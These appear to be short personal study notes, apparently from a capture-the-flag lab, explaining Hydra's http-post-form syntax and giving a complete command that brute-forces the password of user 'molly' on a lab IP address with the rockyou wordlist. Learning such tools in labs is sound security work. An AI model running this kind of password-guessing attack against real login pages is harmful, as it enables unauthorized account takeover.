# Notes

* https://www.blackhat.com/

<hr class="sep-both">

## Hydra

> If you don't use kali, you may use wordlist in [SecLists](https://github.com/danielmiessler/SecLists/).

* Post Web Form
* http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
  * /login
  * name="usernam" is filled with the username (USER)
  * name="password" is filled with the password (PASS)
  * F=incorrect means that the attempt is incorrect is this word is on the page
* hydra -l molly -P rockyou.txt 10.10.19.153 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V